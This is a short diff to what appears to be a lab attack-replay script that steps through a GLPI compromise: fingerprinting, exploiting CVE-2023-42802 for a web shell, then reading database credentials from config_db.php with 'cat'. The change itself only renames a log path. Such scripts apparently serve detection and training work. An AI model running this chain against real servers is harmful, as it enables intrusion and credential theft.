@@ -539,7 +539,7 @@ def main():
 
         # Step 2 - Enumeration: GLPI HTTP fingerprinting (writeup step 2).
         with timing.step(
-            2, "Enumeration", "HTTP/GLPI fingerprinting", "T1595", "/var/log/apache2/access.log"
+            2, "Enumeration", "HTTP/GLPI fingerprinting", "T1595", "/var/log/apache2/helpforge-access.log"
         ):
             fingerprint_glpi(target)
 
@@ -557,7 +557,7 @@ def main():
             "Exploitation",
             "GLPI CVE-2023-42802 exploitation",
             "T1190;T1505.003",
-            "/var/log/apache2/access.log",
+            "/var/log/apache2/helpforge-access.log",
         ):
             shell = exploit_glpi(target)
             www_id = web_cmd(shell, "id")
@@ -570,7 +570,7 @@ def main():
             "Post-Exploitation",
             "Read config_db.php credentials",
             "T1552.001",
-            "/var/log/apache2/access.log",
+            "/var/log/apache2/helpforge-access.log",
         ):
             config = web_cmd(shell, "cat /var/www/glpi/config/config_db.php")
             db_password = parse_db_password(config)
